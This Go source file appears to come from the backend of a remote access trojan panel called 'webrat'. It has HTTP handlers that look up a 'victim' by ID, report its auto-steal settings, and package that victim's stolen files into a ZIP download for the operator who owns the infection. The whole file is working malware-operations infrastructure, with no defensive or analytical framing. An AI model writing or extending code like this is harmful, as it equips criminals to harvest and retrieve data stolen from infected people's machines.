package httpapi

import (
	"archive/zip"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"webrat-go-api/internal/stealstore"
)

func (s *Server) handleStealInfo(w http.ResponseWriter, r *http.Request) {
	login := loginFromContext(r)
	if login == "" {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	victimID := strings.TrimSpace(r.URL.Query().Get("victim_id"))
	if victimID == "" {
		http.Error(w, "missing victim_id", http.StatusBadRequest)
		return
	}

	if s.db != nil {
		owner, ok, err := s.db.GetVictimOwnerByID(victimID)
		if err != nil || !ok || strings.ToLower(owner) != strings.ToLower(login) {
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
	}

	dir := stealstore.DataDir(victimID)
	autoSteal := "disabled"
	stealTime := "-"

	if data, err := os.ReadFile(filepath.Join(dir, "meta.json")); err == nil {
		var meta map[string]string
		if json.Unmarshal(data, &meta) == nil {
			if v := meta["auto_steal"]; v != "" {
				autoSteal = v
			}
			if v := meta["steal_time"]; v != "" {
				stealTime = v
			}
		}
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]string{
		"auto_steal": autoSteal,
		"steal_time": stealTime,
	})
}

func (s *Server) handleStealDownload(w http.ResponseWriter, r *http.Request) {
	login := loginFromContext(r)
	if login == "" {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	victimID := strings.TrimSpace(r.URL.Query().Get("victim_id"))
	fmt.Printf("[steal-download] login=%s victimID=%s\n", login, victimID)
	if victimID == "" {
		http.Error(w, "missing victim_id", http.StatusBadRequest)
		return
	}

	if s.db != nil {
		owner, ok, err := s.db.GetVictimOwnerByID(victimID)
		if err != nil || !ok || strings.ToLower(owner) != strings.ToLower(login) {
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
	}

	dir := stealstore.DataDir(victimID)
	fmt.Printf("[steal-download] dir=%s\n", dir)

	hasFiles := false
	_ = filepath.WalkDir(dir, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return nil
		}
		if !d.IsDir() && d.Name() != "meta.json" {
			hasFiles = true
		}
		return nil
	})

	if !hasFiles {
		http.Error(w, "no steal data", http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "application/zip")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"steal_%d.zip\"", time.Now().UnixNano()))

	zw := zip.NewWriter(w)
	defer func() { _ = zw.Close() }()

	_ = filepath.WalkDir(dir, func(path string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		if d.Name() == "meta.json" {
			return nil
		}
		rel, _ := filepath.Rel(dir, path)
		rel = strings.ReplaceAll(rel, "\\", "/")

		data, err := os.ReadFile(path)
		if err != nil {
			return nil
		}
		fw, err := zw.Create(rel)
		if err != nil {
			return nil
		}
		_, _ = fw.Write(data)
		return nil
	})
}
